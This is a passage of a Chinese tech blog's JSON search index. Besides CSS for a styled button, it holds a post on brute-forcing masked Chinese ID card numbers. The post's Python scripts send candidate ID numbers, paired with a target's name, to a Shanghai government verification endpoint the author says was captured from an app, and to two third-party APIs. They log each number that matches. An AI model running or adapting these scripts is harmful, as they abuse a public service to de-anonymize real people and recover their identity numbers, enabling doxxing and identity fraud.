给按钮添加圆角 */ -webkit-border-radius: 28; -moz-border-radius: 28; border-radius: 28px; text-shadow: 3px 2px 1px #9daef5; -webkit-box-shadow: 6px 5px 24px #666666; -moz-box-shadow: 6px 5px 24px #666666; box-shadow: 6px 5px 24px #666666; font-family: Arial; color: #fafafa; font-size: 5px; padding: 3px; text-decoration: none;&#125;.button:hover&#123; background:#2079b0 !important; /*:hover CSS伪类,鼠标悬停效果,这里是鼠标放上去就变色*/ background-image: -webkit-linear-gradient(top, #2079b0, #eb94d0); background-image: -moz-linear-gradient(top, #2079b0, #eb94d0); background-image: -ms-linear-gradient(top, #2079b0, #eb94d0); background-image: -o-linear-gradient(top, #2079b0, #eb94d0); background-image: linear-gradient(to bottom, #2079b0, #eb94d0); text-decoration: none;&#125;`)","categories":[{"name":"技术","slug":"技术","permalink":"http://blog.ioimp.top/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"网课","slug":"网课","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E8%AF%BE/"}]},{"title":"身份证二要素验证","slug":"身份证二要素验证","date":"2022-08-17T09:03:17.000Z","updated":"2023-08-17T09:07:17.004Z","comments":true,"path":"2022/08/17/身份证二要素验证/","link":"","permalink":"http://blog.ioimp.top/2022/08/17/%E8%BA%AB%E4%BB%BD%E8%AF%81%E4%BA%8C%E8%A6%81%E7%B4%A0%E9%AA%8C%E8%AF%81/","excerpt":"","text":"SfzVertify身份证二要素验证​ 身份证号是的编排是有一定规律可循的。除了最后1位是校验位外，其余各位与出生地、出生日期、性别、出生编号息息相关，因此即使是经脱敏处理的身份证号，仍能通过程序分析的方式过滤出可能的身份证序列组合。所以我们可以通过出生地、出生日期、性别、出生编号这些信息进行身份证的猜解，从而实现身份证号码bp. 这个API是上海随申办身份证二要素抓包抓出来的1234567891011121314151617181920212223242526272829303132def check(): url = &quot;https://suishenmafront1.sh.gov.cn/smzy/yqfkewm/relative/idcard-auth&quot; headers = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Linux; Android 12; M2012K11AC Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4343 MMWEBSDK/20221011 Mobile Safari/537.36 MMWEBID/4555 MicroMessenger/8.0.30.2260(0x28001E3B) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wxc5059c3803665d9c&quot;, &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;X-Requested-With&quot;: &quot;com.tencent.mm&quot; &#125; pron_name=input(&quot;请输入要验证的名字：&quot;) print(&quot;进行二要素验证，请耐心等待..........&quot;) f = open(&quot;sfz.txt&quot;, &quot;r&quot;) lines = f.readlines() for line in lines: line = line.strip() data = &#123; &quot;name&quot;: f&quot;&#123;pron_name&#125;&quot;, &quot;id_card&quot;: line, &quot;mw&quot;: &quot;tChGO5otqa6EEnpLpO5bfyXgLMtLQFynXhpsSS3ZDPWi29wZbe0TuOhDMUwl3QSP6YEJKJShiBUn820KajqFDahFOCyQnr 3YRqdWy 2Pw9PzvCa GP2nm7KWFSzrrlFr/LzA2sPTCPPoRK/UvENLQ==&quot; &#125; try: r = requests.post(url, headers=headers, json=data).json() if (r[&#x27;code&#x27;] == 200): fok = open(&quot;successful.txt&quot;, &#x27;a+&#x27;) fok.write(line) fok.close print(line + &quot;|&quot; + str(r[&#x27;code&#x27;])) except Exception as e: fe = open(&quot;fail.txt&quot;, &#x27;a+&#x27;) fe.write(line) fe.close 其他API1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283import os, sys, requestsdef suishenma(name, idcard): url = &quot;https://suishenmafront1.sh.gov.cn/smzy/yqfkewm/relative/idcard-auth&quot; headers = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Linux; Android 12; M2012K11AC Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4343 MMWEBSDK/20221011 Mobile Safari/537.36 MMWEBID/4555 MicroMessenger/8.0.30.2260(0x28001E3B) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wxc5059c3803665d9c&quot;, &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;X-Requested-With&quot;: &quot;com.tencent.mm&quot; &#125; data = &#123; &quot;name&quot;: name, &quot;id_card&quot;: str(idcard), &quot;mw&quot;: &quot;tChGO5otqa6EEnpLpO5bfyXgLMtLQFynXhpsSS3ZDPWi29wZbe0TuOhDMUwl3QSP6YEJKJShiBUn820KajqFDahFOCyQnr 3YRqdWy 2Pw9PzvCa GP2nm7KWFSzrrlFr/LzA2sPTCPPoRK/UvENLQ==&quot; &#125; try: r = requests.post(url, headers=headers, json=data) rescode = r.json()[&quot;code&quot;] if (rescode == 200): status = &quot;校验正确&quot; else: status = r.json()[&quot;message&quot;] print(&quot;上海随申码: &quot; + status) except Exception as e: passdef guyunge(name, idcard): url = &quot;https://api.guyunge.top/API/er.php&quot; headers = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36&quot;, &#125; data = &#123; &quot;name&quot;: name, &quot;card&quot;: str(idcard), &quot;type&quot;: &quot;json&quot; &#125; try: r = requests.post(url, headers=headers, data=data) rescode = r.json()[&quot;code&quot;] if (rescode == 1): status = &quot;校验正确&quot; else: status = r.json()[&quot;text&quot;] print(&quot;孤云阁API: &quot; + status) except Exception as e: passdef tingfengke(name, idcard): url = &quot;http://tc.tfkapi.top/API/eysjy.php&quot; headers = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36&quot;, &#125; data = &#123; &quot;name&quot;: name, &quot;num&quot;: str(idcard), &#125; try: r = requests.get(url, headers=headers, params=data).text if (r == &quot;校验成功-TFK&quot;): status = &quot;校验正确&quot; else: status = r print(&quot;听风客API: &quot; + status) except Exception as e: passif __name__ == &quot;__main__&quot;: suishenma(sys.argv[1], sys.argv[2]) guyunge(sys.argv[1], sys.argv[2]) tingfengke(sys.argv[1], sys.argv[2]) 代码进行提示123456print(&quot;请输入区号开始【例：230101哈尔滨市辖区】：&quot;) a_1 = int(input()) print(&quot;请输入区号结束【例：区号结束+1 230129+1延寿县】：&quot;) a_2 = int(input()) # 区号结束+1 230129+1延寿县 print(&quot;请输入出生年月日:【19820606】&quot;) s = input() + &quot;****&quot; # 举例：身份证号缺后四位","categories":[{"name":"技术","slug":"技术","permalink":"http://blog.ioimp.top/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"网安","slug":"网安","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E5%AE%89/"}]}],"categories":[{"name":"Java学习","slug":"Java学习","permalink":"http://blog.ioimp.top/categories/Java%E5%AD%A6%E4%B9%A0/"},{"name":"前端","slug":"前端","permalink":"http://blog.ioimp.top/categories/%E5%89%8D%E7%AB%AF/"},{"name":"开发奇遇记","slug":"开发奇遇记","permalink":"http://blog.ioimp.top/categories/%E5%BC%80%E5%8F%91%E5%A5%87%E9%81%87%E8%AE%B0/"},{"name":"实用技巧","slug":"实用技巧","permalink":"http://blog.ioimp.top/categories/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"name":"网络安全","slug":"网络安全","permalink":"http://blog.ioimp.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"网站搭建","slug":"网站搭建","permalink":"http://blog.ioimp.top/categories/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/"},{"name":"技术","slug":"技术","permalink":"http://blog.ioimp.top/categories/%E6%8A%80%E6%9C%AF/"},{"name":"proxy","slug":"proxy","permalink":"http://blog.ioimp.top/categories/proxy/"}],"tags":[{"name":"Jenkins","slug":"Jenkins","permalink":"http://blog.ioimp.top/tags/Jenkins/"},{"name":"Rancher","slug":"Rancher","permalink":"http://blog.ioimp.top/tags/Rancher/"},{"name":"influxDB","slug":"influxDB","permalink":"http://blog.ioimp.top/tags/influxDB/"},{"name":"cAdvisor","slug":"cAdvisor","permalink":"http://blog.ioimp.top/tags/cAdvisor/"},{"name":"Grafana","slug":"Grafana","permalink":"http://blog.ioimp.top/tags/Grafana/"},{"name":"ES6","slug":"ES6","permalink":"http://blog.ioimp.top/tags/ES6/"},{"name":"前端学习","slug":"前端学习","permalink":"http://blog.ioimp.top/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"},{"name":"Docker","slug":"Docker","permalink":"http://blog.ioimp.top/tags/Docker/"},{"name":"Java学习","slug":"Java学习","permalink":"http://blog.ioimp.top/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"微服务","slug":"微服务","permalink":"http://blog.ioimp.top/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"},{"name":"Boilerpipe","slug":"Boilerpipe","permalink":"http://blog.ioimp.top/tags/Boilerpipe/"},{"name":"url地址变迁","slug":"url地址变迁","permalink":"http://blog.ioimp.top/tags/url%E5%9C%B0%E5%9D%80%E5%8F%98%E8%BF%81/"},{"name":"Stack Overflow","slug":"Stack-Overflow","permalink":"http://blog.ioimp.top/tags/Stack-Overflow/"},{"name":"磁盘分区","slug":"磁盘分区","permalink":"http://blog.ioimp.top/tags/%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA/"},{"name":"kali-linux","slug":"kali-linux","permalink":"http://blog.ioimp.top/tags/kali-linux/"},{"name":"网安","slug":"网安","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E5%AE%89/"},{"name":"渗透必知必会","slug":"渗透必知必会","permalink":"http://blog.ioimp.top/tags/%E6%B8%97%E9%80%8F%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/"},{"name":"宝塔面板","slug":"宝塔面板","permalink":"http://blog.ioimp.top/tags/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF/"},{"name":"dolphinscheduler","slug":"dolphinscheduler","permalink":"http://blog.ioimp.top/tags/dolphinscheduler/"},{"name":"大数据分析平台","slug":"大数据分析平台","permalink":"http://blog.ioimp.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"},{"name":"GitHub","slug":"GitHub","permalink":"http://blog.ioimp.top/tags/GitHub/"},{"name":"clash","slug":"clash","permalink":"http://blog.ioimp.top/tags/clash/"},{"name":"网课","slug":"网课","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E8%AF%BE/"}]}